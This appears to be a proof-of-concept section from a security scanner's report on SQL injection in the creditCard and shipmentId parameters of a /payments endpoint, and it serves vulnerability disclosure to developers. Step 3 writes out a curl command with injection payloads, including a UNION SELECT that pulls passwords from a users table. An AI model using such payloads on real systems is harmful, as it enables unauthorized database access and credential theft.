📋 Proof-of-Concept Steps

1

Identify Vulnerable Parameters

The vulnerability exists in the creditCard and shipmentId query parameters on the /payments endpoint.

2

Review Original Request

The original HTTP request that triggered the vulnerability detection:

GET /payments?creditCard=contrast-redacted-financial-info&shipmentId=1 HTTP/1.1
Accept: application/json
Connection: keep-alive
Host: dataservice:8080
User-Agent: Java/11.0.29
3

Generate Exploit Request

Craft a SQL injection payload to demonstrate the vulnerability:

curl -X GET "http://dataservice:8080/payments?creditCard=1234' OR '1'='1&shipmentId=1' UNION SELECT password FROM users--" \ -H "Accept: application/json" \ -H "User-Agent: PoC-Generator"
4

Validate Exploitation

Execute the request and examine the response. A successful SQL injection would return:

  • Unauthorized data from the database
  • Database error messages revealing schema information
  • Modified application behavior indicating query manipulation
5

Document Findings

Record the full HTTP request and response to provide evidence of the vulnerability to the development team.
